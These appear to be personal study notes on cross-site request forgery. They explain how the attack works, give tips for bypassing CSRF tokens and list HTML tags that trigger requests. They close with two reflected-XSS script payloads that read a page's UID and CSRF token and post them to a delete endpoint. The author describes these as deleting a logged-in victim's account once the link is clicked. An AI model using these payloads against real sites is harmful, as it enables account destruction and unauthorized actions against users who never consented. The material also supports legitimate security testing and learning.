# CSRF

Exploits trust between browser and a vulnerable website.
Logged in sessions of banks etc. save cookies and when the user visits a malicious website and it has a hidden form submitting requests to the vulnerable website and the browser sends the cookies considering it's a regular request.

Generally, application frameworks like Ruby on Rails are increasingly protecting web
forms if the site is performing POST requests, however, this isnâ€™t the case for GET
requests, so be sure to keep an eye out for any GET HTTP calls which change serverside
user data (like DELETE actions). Lastly, if you see a site is sending a CSRF token with
a POST request, try changing the CSRF token value or removing it entirely to ensure the
server is validating its existence.

Use a proxy and check all the
resources that are being called when you visit a target site or application. You
may find an information leak with sensitive data, such as a CSRF token.

## CSRF trigger tags

<img> the source value URL will be requested.
<iframe> also has the source just like the IMG tag. a hidden iframe will be ideal.
<script> src does the same.

Example -

XSS + CSRF
Scenario - We have reflected XSS on a page and we can edit HTML.
Now there is also a UID and CSRF token which we need to be able to carry out CSRF.

We first leverage XSS as
www.example.com/test?url=

`'
<script>
var uid = document.forms[0].elements[0].value; //Traversing HTML for values
var token = document.forms[0].elements[1].value;
var req = new XMLHttpRequest();
req.open("POST", "/webapp/csrf/xss/delete", true);
req.setRequestHeader("Content-type", "x-www-form-urlencoded");
req.send("uid="+uid+ "&csrf_token="+token);
</script>
'`
URL Encode this and we will be able to delete account when a logged in user clicks this link.

If we want to do anything after the change is done we can do the following -
`'
<script>

var uid = document.forms[0].elements[0].value; //Traversing HTML for values
var token = document.forms[0].elements[1].value;

var req = new XMLHttpRequest();
req.onreadystatechange = function(){
  if(req.readyState == 4 && req.status ==200)
{
    alert(req.responseText);
}
};
req.open("POST", "/webapp/csrf/xss/delete", true);
req.setRequestHeader("Content-type", "x-www-form-urlencoded");
req.send("uid="+uid+ "&csrf_token="+token);

</script>
'`
